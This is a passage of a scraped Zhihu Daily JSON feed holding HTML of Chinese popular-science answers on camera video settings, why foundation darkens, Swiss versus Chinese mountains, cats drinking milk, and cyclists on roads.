alt=\"\"></figure><p>日常使用 Log 拍摄时，需要注意以下两个问题： ​</p>\n<p>起跳 ISO，比如，索尼的 Slog3 的起跳 ISO 是 800，如果在打白天，也想使用大光圈拍摄，那么减光镜就是不可或缺的配件； ​</p>\n<p>对于精准曝光要求极高，所以你得上监视器，或者使用直方图，斑马纹来确认你的曝光是否准确，相信我，大多数新手拍 Log 会在精准曝光上载无数个跟头，一个比较实用的曝光的经验是，<strong>在保留画面信息的基础上，尽量向右曝光。</strong></p>\n<blockquote>注:<br>有些相机厂商虽然也支持 RAW 外录和 N-log，但是需要你『花钱』升级​固件，比如尼康 Z6/7</blockquote>\n<p><strong>Lut：是滤镜吗</strong></p>\n<p>Lut，即为 look up table，直译就是颜色查找表，输入一个值，然后换成另外一个值，从而达到调色的目的。 是不是看起来跟滤镜的作用一样，但实际上原理是相当不同的。 你可以简单理解为，LUT 是颜色替换，而滤镜是计算。 ​</p>\n<p>当然，你也可以在网上找到无数的 Lut，有兴趣的话，也可以自己做一个。​</p>\n<p><strong>HLG</strong></p>\n<p>随着技术的进步，HDR 设备开始普及，包括你手头的旗舰手机几乎都开始支持 HDR 了。</p>\n<blockquote>关于更多关于 HDR 的介绍，可以参考我之见的回答。</blockquote>\n<p><a href=\"https://www.zhihu.com/question/19774840/answer/660920430\">HDR 是什么？有哪些具体介绍？</a></p>\n<p>​</p>\n<p>相机们也可以加入了 HDR 视频的拍摄能力。 ​</p>\n<p>这里就不得不提 HLG 标准了，HLG 是 BBC 和 NHK 联合开发 HDR 标准，提供了编码宽动态范围（HDR）的能力，也保留了标准动态范围（SDR）的支持，使得他的兼容性很好。</p>\n<p>而且 HLG 标准并不需要你掏专利费，所以很多厂商也纷纷投入了 HLG 怀抱，比如索尼，松下，甚至大疆的大多数设备，都可以拍摄 HLG 视频。由于采用的是相同的标准，即使是不同厂家的设备拍摄的 HLG 视频，后期在颜色匹配上也比较完美。 ​</p>\n<blockquote>p.s <br>iPhone12 拍摄的 HDR 视频，标准为杜比视界。实际上 iPhone12 拍摄的也是 HLG 视频，只不过加了一层杜比视界的元数据层。</blockquote>\n<p>​</p>\n<p>相对于 Log，HLG 还有以下两个特点： ​</p>\n<p>画面没有那么灰，颜色显示较为正常，甚至不用处理也可以直出使用； 没有起跳 ISO 的限制，使用起来比较方便。 ​</p>\n<p>HLG 同 Log 一样，也有 HLG1，HLG2，HLG3 的区别，在暗部和亮部的保留和取舍上各有倾向。要依据你实际拍摄的画面而定。有空了可以深入探讨这个问题。 ​</p>\n<p>对于日常使用或者新手来讲，HLG 明显更加友好。 ​</p>\n<p>​</p>\n<p><strong>Rec.709，色彩标准</strong></p>\n<p>​</p>\n<p>这是一个 1990 年发布的统一色彩标准，色域和 sRGB 相同。 ​</p>\n<p>这个色域并不大，多数设备拍摄的素材都可以轻松超过，但是一些显示设备或者产品服务，就只支持这个标准，你大于这个标准拍摄的画面，实际播放是没有任何意义的。 ​</p>\n<p>也就是说，为了能在电视上，普通显示器上正确的显示色彩，就得按照 Rec.709 的规定来。 ​</p>\n<p>但是随着 HDR 设备的普及，就连 B 站也开始支持 HDR 了，Rec.709 这个标准貌似不太够用了，于是新的标准也诞生了，BT2020，支持 4k，8K，最高 120 帧的速率，以及 12 位的深度。 ​</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f0bcc6186be34fd1ebbcab74a95c4c81_b.jpg\" alt=\"\"></figure><p>所以你在拍摄 Log 或者 HLG 视频时，可以将色域选择为 bt2020，这样可以在 HDR 显示上获得更好的观影体验。</p>\n<p><strong>快门角度还是速度</strong></p>\n<p>​</p>\n<p>照相机除了拍照也可以拍视频，电影机也可以拍照，那他们的区别到底是什么？ 其实最明显的一个操作逻辑上的区别，就是快门。 ​</p>\n<blockquote>关于快门的前世今生，可以参考我之前的这篇文章： <a href=\"https://www.zhihu.com/question/36033197/answer/1693671720\"><span>https://www.</span><span>zhihu.com/question/3603</span><span>3197/answer/1693671720</span><span></span></a> ​</blockquote>\n<p>如果你用过 Bmpcc，之类的摄影机，在快门参数的调节上，使用的是快门角度。 ​</p>\n<p> <br><br>这个概念其实来自于电影拍摄，电影为 24 帧每秒，那每一帧的快门速度就为 1/24s。但是人们发现这个速度的动态模糊太大了，导致视频看起来一点都不清晰。 那么如何调节胶片拍摄的时候的快门速度呢？加上一个旋转快门就好了。 ​<br><br>比如这个 180°的快门装置，就能遮挡一半的光线，让快门速度来到 1/48s。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b2114d86ca73d5272122b3624f4469f1_b.gif\" alt=\"\"></figure><p>当然也有 45°的快门和 270°的快门，做法也比较简单，调节快门板的角度就好了。 ​</p>\n<p>人们发现，180°的时候，在画面锐度和动态模糊间达到了一个完美的平衡，所以，以前的电影机和摄影机基本上都是以 180°的快门角度来拍摄视频。 ​</p>\n<p>在摄影机上，设置为 180 度的快门角度就好了，但是对于普通相机来说，快门速度要按照二倍帧率的倒数来设定：</p>\n<ul>\n<li>24 帧，快门速度为 1/50s；</li>\n<li>60 帧，快门速度为 1/120s;</li>\n<li>120 帧，快门速度为 1/250s</li>\n</ul>\n<p>来达到类似的效果。 ​</p>\n<p>不过当前的相机基本上都提供能自定义拍摄参数的保存，方便你快速切换。 ​</p>\n<p>​</p>\n<p><strong>不可忽视的限制</strong></p>\n<p>使用相机或者单反拍视频时，总是存在各种各样的限制。</p>\n<p>这个限制主要是来自于数据量，拍摄高分辨率高帧率的视频，会产生很大热量，散热如果不给力的话，相机就会做录制时长的限制，比如很多相机只能连续录制 30 分钟的视频，要么就直接给你来一个过热警告。</p>\n<p>另一个是高分辨率高帧率的视频对存储卡的写入速度也提出了要求，而高速卡的价格往往也不便宜。 ​</p>\n<p>而且数据量的增大，会增加相机的运算负担，一些功能在高分辨或者高帧率下就被禁用，比如：</p>\n<p>大部分相机在 1080P/120 帧的模式下，无法启用人脸 / 人眼对焦，只能使用最为传统的反差对焦；</p>\n<p>代理视频的录制功能，只能后期通过电脑生成代理视频。 ​</p>\n<p><strong>是时候按下录制键了</strong></p>\n<p>无论你使用怎样的设备，无论这个设备的性能如何，最重要的是出去拍。 以上讲的所有知识，都只是为了让你获得一个更加好看的画面，让你的画面更加锐利，减少噪点，但是画面永远不是全部，他只是锦上添花的部分。 ​</p>\n<p>更加重要的是内容和故事。 如何讲好一个故事，才是你应该不断思考的问题。 ​</p>\n<p>​</p>\n<p>你还对那些视频制作的知识感兴趣，或者有哪些你认为不对的地方，可以在评论区里边提出来，我们一起讨论。 ​​</p>\n<p> <br><br>以上。 ​<br><br><a href=\"https://www.zhihu.com/xen/market/remix/paid_column/1339602918698377216\">2021 相机推荐与选购：这款相机该不该买？看看硬核摄影科普</a><br><br>相关阅读：<br><br><a href=\"https://www.zhihu.com/question/439458908/answer/1682895110\">哪位大神可以详细讲解下关于相机 ISO 方面的介绍？</a><br><br><a href=\"https://www.zhihu.com/question/31142439/answer/1711732441\">为什么相机光圈 F 值越大，实际光圈越小，谁发明的，有什么来由吗？</a><br><br><a href=\"https://zhuanlan.zhihu.com/p/305714803\">李明殊：李明殊的摄影类回答文章导航</a></p>\n<p><br>​</p>\n<div><a href=\"https://zhuanlan.zhihu.com/p/387948491\">阅读原文</a></div>\n</div>\n</div>\n</div>","link":"https://daily.zhihu.com/story/9737976"},{"title":"粉底液为什么会暗沉？","date":"2021-07-11 23:06:51","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-5ec2a04d747dff9845713ffe0964954b_l.jpg?source=8673f162\"><span>胖博士，</span><span>懂你皮肤问题的清华胖师兄</span>\n<a href=\"https://www.zhihu.com/question/280946484/answer/1984237686\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>很多博主说，粉底因为氧化所以暗沉。这个观点大概是美妆届流传最广的“伪科学”。</strong></p>\n<blockquote>如果粉底液真的那么容易“被氧化”，为什么在瓶子里放几年一点颜色都不变？<br>如果粉底液真的那么容易“被氧化”，为什么品牌不加点抗氧化剂解决问题？</blockquote>\n<p>从最简单的逻辑上来说，粉底液氧化暗沉的说法就不成立。当然，从科学上也可以的出同样的结论。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-666a80082209742fa73445d780fffb12_720w.jpg?source=8673f162\" alt=\"\"><figcaption>暗沉</figcaption></figure><p><strong>粉底液里面没有容易被氧化的成分</strong></p>\n<p>粉底液里最主要的成分是水，油脂，硅油，有机硅乳化剂 / 成膜剂，色粉，色素。</p>\n<p>水自然不必说，从来没听过水会被氧化的。</p>\n<p>某些油脂的确容易被氧化，这些多为含有不饱和脂肪酸的天然油脂。这一类油脂在护肤里面用的比较多，而在粉底里面，用的大部分都是饱和的合成油脂，因此不存在氧化问题。况且油脂氧化之后，除了变色之外，还会酸败，产生俗称的“哈喇”味。你闻到过粉底液里面有这种味道吗？</p>\n<p>硅油，有机硅乳化剂和成膜剂都属于有机硅，他们都是超级稳定的成分。稳定到在自然界里几百万年也不会降解的那种。你觉得这种东西会被氧化吗？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3d5bf5a28f4220cfbc5ad0af69ed83b1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>粉底液里面有不少有机硅成分</figcaption></figure><p>色粉是一些无机颜料。粉底里用的比较多的是钛白粉（二氧化钛），铁黄（一水合三氧化二铁），铁红（三氧化二铁）和铁黑（四氧化三铁）。二氧化钛很多地方都能见到，这玩意放在阳光下晒三年都不会变色。三氧化二铁本身就是铁的氧化形态，无从氧化。四氧化三铁是磁铁，你见过哪个吸铁石被氧化吗？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2ec9d6e1334531dfa7be4edc86b2c54b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>稳定的色粉</figcaption></figure><p>色素都是大分子有机物，大概是唯一有可能被“氧化”的成分。然而这玩意的稳定性也不是大家想象的那么脆弱。放在水里分散好，不加稳定剂和抗氧化剂，保持个几年也没问题。很重要的是，这一类色素，即使被氧化，也不是颜色变暗，而是变成白色！</p>\n<p><strong>粉底液涂到脸上到底发生了哪些变化？</strong></p>\n<p>粉底液的成分非常稳定。既然粉底液暗沉和氧化没关系，那么这个锅应该由物理变化来背。我们不妨分析一下，粉底液涂到脸上的过程中，到底发生了什么。</p>\n<p>把粉底液在脸上均匀涂开，里面的水分会首先挥发掉。这个过程很短，大概也就几分钟。</p>\n<p>随后是里面的成膜剂成膜。这个时间从几分钟到十几分钟不等。成膜之后，粉底可以牢牢的把色粉抓住，形成一张坚韧的网络。避免浮粉，脱妆等问题。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7c999a32c404bb759c78b80a5f0c6581_720w.jpg?source=8673f162\" alt=\"\"><figcaption>成膜剂的原理</figcaption></figure><p>然后是挥发性硅油挥发。为了缓解配方的油腻，粉底液配方里面一般都会加入轻质硅油，或者会挥发的硅油，保证轻盈的触感。这个过程从半个小时到几个小时不等。</p>\n<p>硅油挥发完之后，上脸的粉底液本身已经不会发生变化了，理论上，如果没有外界变量，也不会出现任何外观的变化。</p>\n<p>当然这只是理论，实际上，粉底液涂在脸上，周边环境一直都在变化。最明显的就是出油和出汗。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-73599f57bf289e366a333fc8754e62c8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>出油</figcaption></figure><p>出汗对粉底液的影响不大，因为粉底上脸之后，剩下的都是不亲水的成分，因此汗水也就没法影响粉底液。</p>\n<p>然而出油就不一样了。因为色粉，油脂，成膜剂这些成分都是油溶性的。面部出油之后，会改变脸上粉底的结构。而这就是粉底液暗沉的罪魁祸首。</p>\n<p><strong>粉底液暗沉两部曲</strong></p>\n<p>绝大部分粉底液暗沉都是在使用一天之后，到了下午，显得尤其暗沉。当然，也有一些奇葩粉底液，使用半个小时或者一个小时之后就开始暗沉。粉底液里面除了前面提到的那些成分之外，品牌还会在里面加入一些控油粉体。在这些粉体吸收油脂饱和之前，脸上出油都不会对面部的粉底产生影响，于是可以保持完美的妆容。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-83f101ff3da98f8caa7123b5441bb3bf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>多孔微球可以吸油</figcaption></figure><p>但是如果控油粉体的吸油能力不足，或者根本没加吸油粉体。再搭配质量很差的成膜剂，粉底液暗沉就恐怖到天际了。</p>\n<p>出油之后，毛孔分泌的油脂把服帖的粉底液膜顶起。这时候如果成膜剂的能力很强，而且柔韧十足，不会带来太大的问题。然而如果成膜剂质量太差，那么成膜剂本身就会破损，带来不一致的视觉效果。此外，抓取不同色粉的能力不一样，不同颜色色粉因为质地不一样，有可能让颜色更深的铁黄铁黑脱离成膜剂的束缚，跑到表面来。于是看起来颜色就更深了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ea01b5c3df8fdfe9000f3f3c85c49e68_720w.jpg?source=8673f162\" alt=\"\"><figcaption>出油让成膜剂破损</figcaption></figure><p>另外，服帖的粉底上完之后因为里面的粉体，会有很好的柔焦雾面效果。然而出油之后，皮脂填充在粉底表面的凹凸不平处，让柔焦雾面效果消失的同时，浸润表面，改变光学效果，让颜色变暗。生活中这种现象很常见，衣服上滴上油滴，颜色就会显得暗。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2b39fa3237bc4a8aaf1b709dcad5e909_720w.jpg?source=8673f162\" alt=\"\"><figcaption>滴在衣服上的油让衣服暗沉</figcaption></figure><p><strong>所以粉底液暗沉和广为流传的氧化真的一毛钱关系也没有。最大的原因还是出油之后成膜剂没法牢牢抓住色粉，以及皮脂浸润粉底，带来光学效应的改变造成的，原理和衣服上滴了油差不多。</strong></p>\n<p>（图片来自网络，侵删）</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/280946484\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737969"},{"title":"该如何反驳「国外的亲戚说瑞士的山比中国的五岳好看」？","date":"2021-07-11 23:06:47","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-0315c1fdf0f87842dba0fd13532558a3_l.jpg?source=8673f162\"><span>博物致知沈梦溪，</span><span>某青少年科普杂志编辑一枚~</span>\n<a href=\"https://www.zhihu.com/question/464888413/answer/1986133610\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>一、比较对象就是错的</strong><strong>瑞士的山和中国五岳地貌成因和海拔完全不同。</strong></p>\n<p>瑞士的山主要是阿尔卑斯山，“国外的亲戚”所说的好看的山应该也就是阿尔卑斯山。</p>\n<p>阿尔卑斯山位于北纬 49°，加上山体海拔高，所以发育了大量的冰川——而冰川是造成阿尔卑斯山美丽风景的主要因素。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6870b1d4746e3df17525e105ce47beb3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>瑞士的阿尔卑斯景观 图 /wiki</figcaption></figure><p>我们看山上的冰川，都是白白的一片，但是这些其实并不是雪，而是冰，非常厚实的冰，一年一年的积雪堆积压实后形成的冰。这些冰层会沿着山坡向下滑动，由于它们又厚又坚硬地，所以会刮削沿途的山壁的岩石，就好像一个刨子一样将山坡上的岩石一层层刮掉，这样就会导致冰川过处山壁陡峭，形成典型的 U 型谷。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8e80885c7674bb7b38ccfc5082e287e9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>近处就看的很清楚，这是极为厚实的冰层 图 /pxhere</figcaption></figure><p>但是如果一座山山峰上有多条冰川会怎么样呢？会把山脊和山峰刮得特别尖锐，形成突兀、陡峭的山体。所以我们看到的带冰川的山峰，都是棱角分明的，这种鲜明的特色自然比较显眼（我没学过美学或者是绘画之类，但是这应该是有一种说法的，希望得到该领域人士的解答）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8e23943be25ab59ddefe75b1481f7b5e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图 / 见水印</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-c49f5affb2314074787311197b8d1cee_720w.jpg?source=8673f162\" alt=\"\"><figcaption>航拍的冰川，看到了吗，都很有棱角的感觉 图 /USGS</figcaption></figure><p>而且，这种山峰由于比较陡峭，所以很容易出现植被的垂直分带性来：山顶是雪白的冰川，向下是裸露的灰色基岩，再向下是低矮草丛、灌木、森林，如果再加上近处看到的各色花朵，以及天空中的蓝天和白云，这就形成了一幅色彩丰富的画面。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8369562bda81fa8e9e5ab1e86a60a08f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图 /naturetrek</figcaption></figure><p>所以，形体鲜明，颜色艳丽，这种风景能不好看吗？</p>\n<p>但是中国五岳在哪里呢？最北的恒山在北纬 39°，比阿尔卑斯低了 10°，气候上完全不同。五岳没有一个是冰川地貌，它们的形态来自于风化。风的吹蚀、雨水的侵蚀、动植物的破坏等，是塑造这些山峰形态的主要因素。它们的作用会让一个山峰越来越浑圆，而不是像冰川那样让山峰变得棱角分明。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1cafe7cf75dd5476a83f0440a8d92c89_720w.jpg?source=8673f162\" alt=\"\"><figcaption>泰山，看到了吗，没有棱角，整个山体是一个浑圆的状态 图 /wiki</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-f49e7961b64713e1abb2cea0c5699c48_720w.jpg?source=8673f162\" alt=\"\"><figcaption>华山，虽然陡峭，山脊也貌似锋利，但这种山形来自于华山花岗岩岩体内本身的裂隙，风霜雨雪沿着这些裂隙向下侵蚀，因此像是将华山劈开一样，不过从照片近处我们依然可以看出山脊是浑圆的 图 /wiki</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-9aaa048f423687fd1e856a5adb244510_720w.jpg?source=8673f162\" alt=\"\"><figcaption>衡山 图 / 马蜂窝@私享世界</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-510079435299ac833f8dcb43ad36c669_720w.jpg?source=8673f162\" alt=\"\"><figcaption>恒山 图 / 大同市人民政府</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-d09e59eb9348d8c53464a91bdde1a230_720w.jpg?source=8673f162\" alt=\"\"><figcaption>嵩山 图 / 见水印</figcaption></figure><p>而且五岳相对来说都是山里面的小弟弟（泰山 1545，华山 2154，恒山 2016，衡山 1290，嵩山 1512），从海拔来说都跟阿尔卑斯山（瑞士境内有 100 座山海拔接近或超过 4000 米）不在一个层级的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a4c925d4d4e64963e0f9618cfee5453a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鄙视某 * 图帝，拿着国外的免费图当自己的图，从来不标来源，还经常对着图瞎讲 图 /https://maps-for-free.com/</figcaption></figure><p>所以，选择五岳跟瑞士的山比，这是完全不公平的，它们不在一个量级上，<strong>要比就找中国的，海拔 4000 米左右的冰川地貌的山跟瑞士比</strong>！</p>\n<p>这些山在哪里呢？我用软件做了一个海拔在 3000-4000 米之间的地区分布图，大家可以在这里面随便找：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cca56af85324f647547eb66a041e287d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>中国海拔 3000-4000 米左右的地区，其中横断山、昆仑山、天山、阿尔泰山、喜马拉雅山南麓都是热门备选区</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-32f8d10bb1719376270c270ae2567f39_720w.jpg?source=8673f162\" alt=\"\"><figcaption>我自己在 Shutterstock 随便就能找一张天山的照片，完全不逊于瑞士的山啊。其他答主也有很多美景的照片，大家可以看他们的，也可以根据我上面给的范围自己寻找</figcaption></figure><p><strong>二、五岳更多地是文化和历史的意义</strong></p>\n<p>上面有一张五岳的分布图不知道大家注意到没有，大家仔细看看，就会发现五岳都有一个共同点：它们都在平原或是盆地边上。</p>\n<p>中国的古人很早就开拓了平原（毕竟农耕民族……），而由于平原本身海拔低，对比之下平原周边的山就容易显得高大了，而由于平原上容易聚集大量人口和大型城市，所以文化也就很容易诞生。在这种背景下，这些古老的文化自然就会选择周边高山作为祭祀或者是与天地沟通的地点——毕竟这是离得近的最高点了。</p>\n<p>举个例子，比如泰山，这是广袤的华北平原上的最高突起了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-809ce77f50904e55100a565273ed5570_720w.jpg?source=8673f162\" alt=\"\"><figcaption>泰山周边全是平原，这时候认为泰山高大不是很正常的？</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-32715c0430299882930bcd88ba8230e7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>用骨骼地球看泰山及其周边地貌，是不是一下子理解什么叫做一览众山小了？</figcaption></figure><p>所以从秦汉时期开始，各个帝王就不断封禅泰山，将泰山捧上神位。这种几千年来的文化积淀才是五岳“好看”的内涵。</p>\n<p>如果要从文化上比，那五岳不是碾压瑞士的山？你让亲戚找个历代教皇爬过十几次的高山来？（欧洲那地方太小，国王管的面积跟咱的省差不多，只能找教皇了······）</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/464888413\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737966"},{"title":"猫咪真的不能喝牛奶吗？","date":"2021-07-11 23:06:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-840db29afd8d6d69f33c3812f00e56b8_l.jpg?source=8673f162\"><span>王豆皮，</span><span>「动物行为学」爱好者｜兴趣是观察猫咪行为</span>\n<a href=\"https://www.zhihu.com/question/377829147/answer/1927613528\" hidden>阅读原文</a>\n</div>\n<div>\n<p>除了「<strong>乳糖不耐受</strong>」，</p>\n<p>猫喝牛奶还可能存在另一种风险。</p>\n<p>两月龄以上的猫在断奶后，体内乳糖酶的活性往往会下降，就可能会有乳糖不耐受的问题<sup>[1]</sup><sup>[2]</sup>。</p>\n<p>进而导致有些猫不能喝<strong>未经处理的牛奶</strong>，否则可能会导致腹泻、涨肚等症状，严重者可导致去世<sup>[3]</sup>；但通常可以喝舒化奶（无乳糖牛奶）。</p>\n<p>尽管其实没有证据表明，猫体内乳糖酶的活性会完全丧失<sup>[4]</sup>；但出于安全考虑，还是不建议给两月龄以上的猫<strong>贸然</strong>喂食<strong>未经处理的普通牛奶</strong>，以避免不必要的风险和<strong>医疗开销</strong>。</p>\n<p>但除了乳糖不耐受，</p>\n<p>牛奶还可能带给猫另一种风险：</p>\n<p>那就是「<strong>酪蛋白</strong>（casein）<strong>过敏</strong>」<sup>[4]</sup>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-dfb6c92390ed776c63e0ce58a027c6c4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Jagoda Kondratiuk 在 Unsplash 上发布）</figcaption></figure><p>无论对于人还是猫，<strong>酪蛋白</strong>都是牛奶中一种主要的过敏原；它在牛奶中占有较大比重，约占牛奶中蛋白质总量的 86%<sup>[5]</sup>。</p>\n<p>甚至！</p>\n<p>牛自己乳汁中的酪蛋白，</p>\n<p>都可能让牛自己过敏<sup>[6]</sup>！</p>\n<p>这种蛋白正常情况下合成于牛的乳房中，如果挤奶不及时，随着乳腺内压力增加，牛乳中的蛋白质会返回到血流中，就可能会导致牛自己被自己所产出的牛乳给搞过敏了<sup>[6]</sup>！真是令牛语塞。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5241c81a7e7c1104f985ad86d6005eb7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片中的马部分由 Sarah Olive 在 Unsplash 上发布；背景及盒子部分由 Kelli McClintock 在 Unsplash 上发布；知乎 @王豆皮 合成制作）</figcaption></figure><p>所以，当猫表现出诸如腹泻、涨肚等类似乳糖不耐受的症状时，也有可能并不是乳糖的锅，而是猫咪对牛奶中的酪蛋白过敏<sup>[4]</sup>。有案例表明，严重时，牛奶可能引起猫的过敏性休克<sup>[7]</sup>。</p>\n<p>在某项针对猫食物过敏的研究中发现，由牛肉、乳制品和鱼类引起的食物过敏反应，约占研究中全部病例报告的 90%<sup>[8]</sup>。</p>\n<p>关于猫食物过敏的研究目前还不够充分，但一般认为Ⅰ型超敏反应（type Ⅰ hypersensitivity）、Ⅲ型超敏反应（type Ⅲ hypersensitivity）和Ⅳ型超敏反应（type Ⅳ hypersensitivity）都参与了这一过程<sup>[9]</sup>。</p>\n<p>食物过敏可能引起猫从局部到全身性的皮肤瘙痒，严重的猫可能会由于强烈的瘙痒而伤害到自身。猫食物过敏还可能出现红斑、丘疹等病变，以及腹泻、涨肚、肠炎等胃肠道症状<sup>[9]</sup>；有时皮肤症状还会和肠道症状同时出现<sup>[8]</sup><sup>[9]</sup>。</p>\n<p>除了食物中的过敏原，猫咪自身的健康状况也影响着食物过敏的发生；研究表明，当猫的肠道感染了某些寄生虫，会对食物过敏反应起促进作用<sup>[6]</sup>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-e65a18bb73e0b39617b9d0e74c99a169_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Kate Stone Matheson 在 Unsplash 上发布）</figcaption></figure><p>值得注意的一点是，「<strong>食物过敏</strong>」与「<strong>食物不耐受</strong>」是两个不同的问题。</p>\n<p>「食物过敏」，本质上是机体免疫系统对特定物质产生了过度或不适当的反应；</p>\n<p>而「食物不耐受」则并不由免疫系统介导<sup>[6]</sup><sup>[10]</sup>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-96c7e149fa469760bc91e3640bbd51a3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（该图片由 Fernando Jorge 在 Unsplash 上发布）</figcaption></figure><p>如果你第一次给猫尝试某种新猫粮，而没有控制喂食量，导致猫出现了腹泻症状，这种情况<strong>通常</strong>就属于食物不耐受；因此在尝试给猫提供新食物时，一定要注意循序渐进，以避免食物不耐受、进而<strong>避免不必要的医疗开销</strong>。</p>\n<p>可以参照下面这个示意图，灵活运用：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-29fdcc5fcf5ea7ecaa893fea427adf06_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在给幼猫喂奶时，温度也是一个需要考虑的因素。相对于较热和较冷的食物，温度适中的食物更受猫的喜爱<sup>[11]</sup>。</p>\n<p>在喂养幼猫时，如果得不到猫的母乳，也找不到代理猫妈，可以将用于替代母乳的食品加温后，待温度达到 30 度上下时再喂给幼猫<sup>[12]</sup>，以增加适口性和安全性。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/377829147\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737962"},{"title":"为什么大部分骑自行车的人在身后有汽车时都不靠边，不紧不慢地继续骑？","date":"2021-07-11 23:06:36","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-a5cfe5ed195faad06a972c2662d32089_l.jpg?source=8673f162\"><span>Neo，</span><span>汽车行业摸打滚爬～突突突，转摇杆，响起来，启动！</span>\n<a href=\"https://www.zhihu.com/question/348195449/answer/1983156122\" hidden>阅读原文</a>\n</div>\n<div>\n<p>爷爷辈的人，年轻的时候，基本上没有遇到过汽车，最多的是拉板砖的拖拉机。到了父辈这一代，汽车也并不多见，仍然是拖拉机，不同的是拖拉机多了。</p>\n<p>父辈以上的人，大多见过拖拉机，很多也会开拖拉机。当时，开拖拉机算一门手艺活，谁会开拖拉机也算是稀奇。但是拖拉机并不好开，而且还很闹腾。需要你先用摇杆把拖拉机先摇响，然后手扶拖拉机上路。遇到寒冷天气，还要在拖拉机发动机下，烧一把火，否则根本打不着火。打火也是门技术活，需要你先缓慢转动摇杆，然后慢慢加速，最后到最大转速，如果一次摇不响，就再来一次。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6256504339c9830804309f85d3faed10_720w.jpg?source=8673f162\" alt=\"\"></figure><p>叔叔会开，但是曾经在下坡的时候，因为没有掌握好速度，拖拉机车头没听使唤，左右晃动，于是叔叔被拖拉机甩了出去。</p>\n<p>但是彼时的父辈们，走在路上，根本不需要担心身后有车经过。因为老式手扶式拖拉机的两个特点，让人大老远就能“闻声识车”。</p>\n<ul>\n<li>\n<strong>1、声音特别大</strong>，一台柴油机直接架在车头，启动了就“咔咔咔”响个不停，几百米外就能听到。</li>\n<li>\n<strong>2、速度特别慢，</strong>走在马路中央，如果脚步快些，说不定拖拉机还追不上。最高时速二十几公里，和现在的低速电瓶车差不多。</li>\n</ul>\n<p>所以他们大胆得走在路上，毫无顾忌。即便拖拉机靠近了，<strong>一是声音大到受不了，赶紧让路；二是有足够的反应时间来避让</strong>。于是，老人们大多有不让路的习惯。</p>\n<p>而到了我这一辈，开始有明显的变化，分界线是从一条马路开始。自记事开始，老家的路开始变化。先由土路变成煤渣路，再变成石子路，再过一段时间，石子路被压路机反复碾压，再铺上几层沥青，一条宽阔的柏油马路出现。直到今天，时隔 20 年有余，这条路仍然非常完好。再后来，公路逐渐造起来，公路上跑的汽车也越来越多。</p>\n<p>随着城市化水平日渐提高，新农村建设也马不停蹄。乡村小路越来越少，马路也越来越宽。较早的公路，是没有给非机动车太多空间的，非机动车道很窄的一排，只能容纳一辆电动车通行。而路两边，往往有树，有草丛，如此一来，电动自行车们，几乎不走非机动车道，反而直接走在机动车道上。有些人会比较靠边，而有些人就直接靠中间走。而城市里，有些非机动车道，干脆被划成了停车位，电动车们没法，只能在机动车道上行驶。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-5960f82b9710c497603ece0336215aa0_720w.jpg?source=8673f162\" 